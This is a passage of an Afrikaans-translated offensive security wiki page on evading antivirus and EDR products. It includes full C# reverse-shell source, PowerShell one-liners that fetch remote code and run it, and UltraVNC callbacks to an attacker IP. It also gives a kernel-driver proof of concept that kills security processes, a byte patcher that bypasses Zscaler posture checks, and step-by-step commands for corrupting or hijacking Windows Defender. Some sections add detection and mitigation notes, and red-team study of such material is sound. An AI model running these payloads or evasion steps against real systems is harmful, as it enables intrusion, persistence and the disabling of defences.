Loading C# binaries in memory is al vir 'n geruime tyd bekend en dit bly 'n uitstekende manier om jou post-exploitation gereedskap te laat loop sonder om deur AV opgemerk te word.

Aangesien die payload direk in geheue gelaai word sonder om die skyf te raak, hoef ons slegs bekommerd te wees oor die patching van AMSI vir die hele proses.

Die meeste C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C# assemblies direk in memory uit te voer, maar daar is verskillende maniere om dit te doen:

- **Fork\&Run**

Dit behels die **spawn van 'n nuwe offersproses**, inject jou post-exploitation kwaadwillige kode in daardie nuwe proses, voer jou kwaadwillige kode uit en wanneer dit klaar is, maak die nuwe proses dood. Dit het beide voordele en nadele. Die voordeel van die fork-and-run metode is dat die uitvoering plaasvind **buite** ons Beacon implant proses. Dit beteken dat as iets verkeerd gaan of opgemerk word in ons post-exploitation aksie, daar 'n **veel groter kans** is dat ons **implant oorleef.** Die nadeel is dat jy 'n **groter kans** het om deur **Behavioural Detections** gevang te word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit gaan oor die inject van die post-exploitation kwaadwillige kode **in sy eie proses**. Op hierdie manier kan jy vermy om 'n nuwe proses te skep wat deur AV gescan word, maar die nadeel is dat as iets verkeerd gaan met die uitvoering van jou payload, daar 'n **veel groter kans** is om jou **beacon te verloor** aangesien dit kan crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> As jy meer wil lees oor C# Assembly loading, kyk asseblief na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C# Assemblies **from PowerShell** laai, kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige kode in ander tale uit te voer deur die gecompromitteerde masjien toegang te gee tot die interpreter-omgewing wat op die Attacker Controlled SMB share geïnstalleer is.

Deur toegang te gee tot die Interpreter Binaries en die omgewing op die SMB share kan jy **arbritêre kode in hierdie tale binne die geheue** van die gecompromitteerde masjien uitvoer.

Die repo dui aan: Defender scan steeds die scripts maar deur Go, Java, PHP ens. te gebruik het ons **meer buigbaarheid om statiese signatures te omseil**. Toetsing met lukrake nie-geobfuskate reverse shell scripts in hierdie tale het sukses getoon.

## TokenStomping

Token stomping is 'n tegniek wat 'n aanvaller toelaat om 'n toegangstoken of 'n sekuriteitsproduk soos 'n EDR of AV te manipuleer, waardeur hulle die priviliges kan verminder sodat die proses nie sterf nie, maar dit nie die permisies het om na kwaadwillige aktiwiteite te soek nie.

Om dit te voorkom, kan Windows **voorkom dat eksterne prosesse** handles oor die tokens van sekuriteitsprosesse kry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Soos beskryf in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om net Chrome Remote Desktop op 'n slagoffer se PC te installeer en dit te gebruik om dit oor te neem en volhoubaarheid te handhaaf:
1. Download vanaf https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI-lêer vir Windows om die MSI-lêer af te laai.
2. Voer die installer stil in die slagoffer uit (admin benodig): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop bladsy en klik volgende. Die wizard sal jou vra om te magtig; klik die Authorize knoppie om voort te gaan.
4. Voer die gegewe parameter uit met 'n paar aanpassings: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Let op die pin-parameter wat toelaat om die pin sonder die GUI te stel).

## Advanced Evasion

Evasion is 'n baie ingewikkelde onderwerp; soms moet jy baie verskillende bronne van telemetrie in net een stelsel in ag neem, so dit is amper onmoontlik om heeltemal onopgemerk te bly in volwasse omgewings.

Elke omgewing wat jy teëkom het sy eie sterk- en swakpunte.

Ek moedig jou sterk aan om hierdie praatjie van [@ATTL4S](https://twitter.com/DaniLJ94) te kyk om 'n ingang te kry in meer Advanced Evasion tegnieke.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dit is ook nog 'n goeie praatjie van [@mariuszbit](https://twitter.com/mariuszbit) oor Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik wat dele van die binary sal **verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig identifiseer en dit aan jou uitsplit.\
Nog 'n hulpmiddel wat dieselfde doen is [**avred**](https://github.com/dobin/avred) met 'n oop web diens by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Tot en met Windows10 het alle Windows weergawes met 'n **Telnet server** gekom wat jy (as administrator) kon installeer deur:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Laat dit **begin** wanneer die stelsel opstart en **voer** dit nou uit:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Verander telnet port** (stealth) en deaktiveer firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin downloads hê, nie die setup nie)

**ON THE HOST**: Voer _**winvnc.exe**_ uit en konfigureer die bediener:

- Skakel die opsie _Disable TrayIcon_ aan
- Stel 'n wagwoord in by _VNC Password_
- Stel 'n wagwoord in by _View-Only Password_

Skuif dan die binary _**winvnc.exe**_ en die **nuut** geskepte lêer _**UltraVNC.ini**_ na die **victim**

#### **Reverse connection**

Die **attacker** moet op sy **host** die binary `vncviewer.exe -listen 5900` uitvoer sodat dit gereed is om 'n reverse **VNC connection** te vang. Dan, in die **victim**: Start die winvnc daemon `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit

**WARNING:** Om stealth te behou moet jy 'n paar dinge nie doen nie

- Moet nie `winvnc` begin as dit reeds loop nie, anders sal jy 'n [popup](https://i.imgur.com/1SROTTl.png) veroorsaak. Kontroleer of dit loop met `tasklist | findstr winvnc`
- Moet nie `winvnc` sonder `UltraVNC.ini` in dieselfde gids begin nie, anders sal dit [die config window](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moet nie `winvnc -h` vir hulp uitvoer nie, anders sal jy 'n [popup](https://i.imgur.com/oc18wcu.png) veroorsaak

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Binne GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Nou **begin die lister** met `msfconsole -r file.rc` en **voer** die **xml payload** uit met:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Huidige defender sal die proses baie vinnig beëindig.**

### Kompileer ons eie reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Revershell

Kompileer dit met:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Gebruik dit met:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# gebruik die kompileerder
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lys van C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Voorbeeld: gebruik van Python om injectors te bou:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander gereedskap
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 het 'n klein konsolehulpmiddel genaamd **Antivirus Terminator** gebruik om endpoint-beskermings te deaktiveer voordat ransomware geplaas is. Die instrument bring sy **eie kwesbare maar *gesigneerde* driver** en misbruik dit om geprivilegieerde kernel- operasies uit te voer wat selfs Protected-Process-Light (PPL) AV-dienste nie kan blokkeer nie.

Belangrike afleidings
1. **Signed driver**: Die lêer wat op skyf afgelewer word is `ServiceMouse.sys`, maar die binêre is die wettiglik gesigneerde driver `AToolsKrnl64.sys` van Antiy Labs se “System In-Depth Analysis Toolkit”. Omdat die driver 'n geldige Microsoft-handtekening dra, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) geaktiveer is.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die eerste reël registreer die driver as 'n **kernel service** en die tweede begin dit sodat `\\.\ServiceMouse` vanaf user land beskikbaar word.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD slaan user-mode beskermings heeltemal oor; kode wat in die kernel uitgevoer word kan *protected* prosesse oopmaak, dit beëindig, of met kernel-objekte knoei ongeag PPL/PP, ELAM of ander verskerpingsfunksies.

Detection / Mitigation
•  Skakel Microsoft se vulnerable-driver block list aan (`HVCI`, `Smart App Control`) sodat Windows weier om `AToolsKrnl64.sys` te laai.
•  Monitor skep van nuwe *kernel* services en waarsku wanneer 'n driver gelaai word vanaf 'n world-writable gids of nie op die allow-list voorkom nie.
•  Kyk vir user-mode handles na custom device objects gevolg deur verdagte `DeviceIoControl` oproepe.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** pas device-posture reëls plaaslik toe en vertrou op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpkeuses maak 'n volledige omseiling moontlik:

1. Posture evaluasie gebeur **heeltemal client-side** (n boolean word na die bediener gestuur).
2. Internal RPC endpoints verifieer slegs dat die verbindende uitvoerbare lêer **gesigneer is deur Zscaler** (via `WinVerifyTrust`).

Deur **vier gesigneerde binaries op skyf te patch** kan beide meganismes ge-neutraliseer word:

| Binary | Original logic patched | Result |
|--------|------------------------|--------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gee altyd `1` terug, sodat elke check voldoenend is |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ enige (selfs ongesigneerde) proses kan aan die RPC pipes bind |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang met `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Kortgesny |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nadat die oorspronklike lêers vervang is en die diens-stapel herbegin is:

* **Alle** posture checks vertoon **green/compliant**.
* Ongetekende of gewysigde binaries kan die named-pipe RPC-endpunte oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde gasheer kry onbeperkte toegang tot die interne netwerk soos gedefinieer deur die Zscaler-beleide.

Hierdie gevallestudie toon hoe suiwer kliëntkant-vertrouensbesluite en eenvoudige handtekeningkontroles met net 'n paar byte-patches omseil kan word.

## Misbruik van Protected Process Light (PPL) om AV/EDR met LOLBINs te manipuleer

Protected Process Light (PPL) dwing 'n ondertekenaar/vlak-hiërargie af sodat slegs beskermde prosesse met dieselfde of hoër vlak mekaar kan manipuleer. Aanvallend gesproke, as jy 'n legitim geskose PPL-geaktiveerde binary kan start en sy argumente beheer, kan jy welsynige funksionaliteit (bv. logging) omskakel na 'n ingeperkte, PPL-ondersteunde skryf-primitive teen beskermde gidse wat deur AV/EDR gebruik word.

Wat veroorsaak dat 'n proses as PPL loop
- Die teiken-EXE (en enige gelaaide DLLs) moet onderteken wees met 'n EKU wat PPL-ondersteuning het.
- Die proses moet geskep word met CreateProcess met die vlae: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- 'n Kompatibele beskermingvlak moet aangevra word wat ooreenstem met die ondertekenaar van die binary (bv. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware ondertekenaars, `PROTECTION_LEVEL_WINDOWS` vir Windows-ondertekenaars). Verkeerde vlakke sal by skepping misluk.

Sien ook 'n breër inleiding tot PP/PPL en LSASS-beskerming hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-instrumente
- Oopbron-hulpmiddel: CreateProcessAsPPL (kies die beskermingvlak en stuur argumente deur na die teiken-EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Gebruikspatroon:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Die signed system binary `C:\Windows\System32\ClipUp.exe` maak self 'n nuwe proses en aanvaar 'n parameter om 'n loglêer na 'n deur die oproeper gespesifiseerde pad te skryf.
- Wanneer dit as 'n PPL-proses gelanseer word, gebeur die lêerskrywing met PPL-ondersteuning.
- ClipUp kan nie paaie met spasies ontleed nie; gebruik 8.3 short paths om na gewoonlik beskermde plekke te wys.

8.3 kortpad-hulpmiddels
- Lys kortname: `dir /x` in elke ouer-gids.
- Bepaal kortpad in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (opsomming)
1) Start die PPL-capable LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur 'n launcher te gebruik (bv. CreateProcessAsPPL).
2) Gee die ClipUp log-pad argument om 'n lêerskepping in 'n beskermde AV-gids af te dwing (bv. Defender Platform). Gebruik 8.3 short names indien nodig.
3) As die teiken-binary gewoonlik deur die AV oop of gegrendel is terwyl dit loop (bv. MsMpEng.exe), skeduleer die skrywing tydens opstart voordat die AV begin deur 'n auto-start service te installeer wat betroubaar vroeër loop. Valideer opstart-ordenings met Process Monitor (opstart-logging).
4) By herbegin gebeur die PPL-ondersteunde skrywing voordat die AV sy binaries sluit, wat die teikenlêer korrup maak en die opstart verhinder.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Aantekeninge en beperkings
- Jy kan nie die inhoud wat ClipUp skryf beheer buite die plasing nie; die primitief is meer geskik vir korrupsie as vir presiese inhoudsinspuiting.
- Vereis lokale admin/SYSTEM om 'n diens te installeer/te begin en 'n herbegin-venster.
- Tydsberekening is kritiek: die teiken mag nie oop wees nie; uitvoering tydens opstart vermy lêerslote.

Opsporing
- Proseskreatie van `ClipUp.exe` met ongebruiklike argumente, veral wanneer dit deur nie-standaard launchers as ouer begin word, rondom opstart.
- Nuwe dienste wat gekonfigureer is om verdagte binaries outomaties te begin en gereeld voor Defender/AV te begin. Ondersoek dienscreasie/-modifikasie voor Defender-opstartfoute.
- Lêerintegriteitsmonitering op Defender binaries/Platform-lêergidse; onverwagte lêerskeppings/-wysigings deur prosesse met protected-process-vlags.
- ETW/EDR-telemetrie: soek na prosesse geskep met `CREATE_PROTECTED_PROCESS` en abnormale PPL-vlak gebruik deur nie-AV binaries.

Mitigering
- WDAC/Code Integrity: beperk watter gesigneerde binaries as PPL kan loop en onder watter ouers; blokkeer ClipUp-aanroep buite legitieme kontekste.
- Diens-higiëne: beperk skepping/wysiging van outo-start dienste en monitor manipulasie van opstartvolgorde.
- Sorg dat Defender tamper protection en early-launch protections geaktiveer is; ondersoek opstartfoute wat na binary-korrupsie dui.
- Oorweeg om 8.3 short-name generering op volumes wat security tooling huisves te deaktiveer indien versoenbaar met jou omgewing (toets deeglik).

References for PPL and tooling
- Microsoft Protected Processes — oorsig: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU verwysing: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Tegniek-beskrywing (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender kies die platform waarvandaan dit loop deur subgidse onder te enummer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Dit kies die subgids met die hoogste leksikografiese weergawe-string (bv. `4.18.25070.5-0`), en begin dan die Defender diensprosesse daarvandaan (terwyl dit diens-/registerpaaie ooreenkomstig opdateer). Hierdie seleksie vertrou gidsinskrywings insluitende directory reparse points (symlinks). 'n Administrator kan dit misbruik om Defender na 'n aanvaller-skryfbare pad om te lei en DLL sideloading of diensversteuring te bereik.

Preconditions
- Local Administrator (nodig om gidse/symlinks onder die Platform-gids te skep)
- Vermoë om te herbegin of Defender platform herskepping te aktiveer (diensherbegin tydens opstart)
- Slegs ingeboude gereedskap benodig (mklink)

Why it works
- Defender blokkeer skrywings in sy eie gidse, maar sy platform-seleksie vertrou gidsinskrywings en kies die leksikografies hoogste weergawe sonder om te valideer dat die teiken na 'n beskermde/vertroude pad oplos.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Skep 'n hoër-weergawe gids-symlink binne Platform wat na jou gids wys:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-keuse (herbegin aanbeveel):
```cmd
shutdown /r /t 0
```
4) Verifieer MsMpEng.exe (WinDefend) draai vanaf die omgelei pad:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Jy behoort die nuwe proses-pad onder `C:\TMP\AV\` te sien en die dienskonfigurasie/registry wat daardie ligging weerspieël.

Post-exploitation options
- DLL sideloading/code execution: Verwyder/vervang DLLs wat Defender vanaf sy toepassingsgids laai om kode in Defender se prosesse uit te voer. Sien die afdeling hierbo: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Verwyder die version-symlink sodat by die volgende opstart die geconfigureerde pad nie opgelos word nie en Defender nie kan begin nie:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Let wel dat hierdie tegniek op sigself nie privilege escalation bied nie; dit vereis admin rights.

## API/IAT Hooking + Call-Stack Spoofing met PIC (Crystal Kit-style)

Red teams kan runtime evasion uit die C2 implant verplaas en dit in die teikenmodule self plaas deur die Import Address Table (IAT) te hook en gekose APIs deur die deur die aanvaller beheerde, position‑independent code (PIC) te stuur. Dit generaliseer evasion buite die klein API-oppervlakte wat baie kits blootstel (bv. CreateProcessA), en brei dieselfde beskerming uit na BOFs en post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). Die PIC moet self‑contained en position‑independent wees.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Tipiese evasions sluit in:
  - Memory mask/unmask rondom die oproep (bv. encrypt beacon regions, RWX→RX, verander bladsyname/toestemmings) en herstel daarna.
  - Call‑stack spoofing: bou 'n onskuldige stack en transisieer na die teiken‑API sodat call‑stack analise na verwagte frames oplos.
- Vir versoenbaarheid, exporteer 'n interface sodat 'n Aggressor script (of ekwivalent) kan registreer watter APIs gehook moet word vir Beacon, BOFs en post‑ex DLLs.

Why IAT hooking here
- Werk vir enige kode wat die gehookte import gebruik, sonder om tool‑kode te wysig of op Beacon te staatmaak om spesifieke APIs te proxy.
- Dek post‑ex DLLs: hooking LoadLibrary* laat jou toe om module laaie te onderskep (bv. System.Management.Automation.dll, clr.dll) en dieselfde masking/stack evasion op hul API‑oproepe toe te pas.
- Herstel betroubare gebruik van process‑spawning post‑ex opdragte teen call‑stack–gebaseerde deteksies deur CreateProcessA/W te omsluit.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Aantekeninge
- Pas die patch toe ná relocations/ASLR en voor die eerste gebruik van die import. Reflective loaders soos TitanLdr/AceLdr demonstreer hooking gedurende DllMain van die gelaaide module.
- Hou wrappers klein en PIC-veilig; los die werklike API op via die oorspronklike IAT-waarde wat jy vangs voor patching of via LdrGetProcedureAddress.
- Gebruik RW → RX-oorgange vir PIC en vermy om skryfbare+uitvoerbare bladsye agter te laat.

Call‑stack spoofing stub
- Draugr‑style PIC stubs bou 'n vals oproepketting (return addresses into benign modules) en draai dan na die werklike API.
- Dit oorwin detections wat verwag dat canonical stacks van Beacon/BOFs na sensitiewe APIs lei.
- Kombineer met stack cutting/stack stitching tegnieke om binne verwagte rame voor die API prologue te beland.

Operasionele integrasie
- Voeg die reflective loader voor post‑ex DLLs in sodat die PIC en hooks outomaties initialiseer wanneer die DLL gelaai word.
- Gebruik 'n Aggressor-skrip om teiken-APIs te registreer sodat Beacon en BOFs deursigtig van dieselfde ontduikingspad baatvind sonder kodeveranderings.

Detectie/DFIR-oorwegings
- IAT-integriteit: inskrywings wat na non‑image (heap/anon) adresse oplos; periodieke verifikasie van importpunte.
- Stapelanomalieë: return addresses wat nie aan gelaaide images behoort nie; abrupte oorgange na non‑image PIC; inkonsekente RtlUserThreadStart-afkoms.
- Loader-telemmetrie: in‑proses skrywings na IAT, vroeë DllMain‑aktiwiteit wat import thunks wysig, onverwagte RX‑gebiede geskep tydens laai.
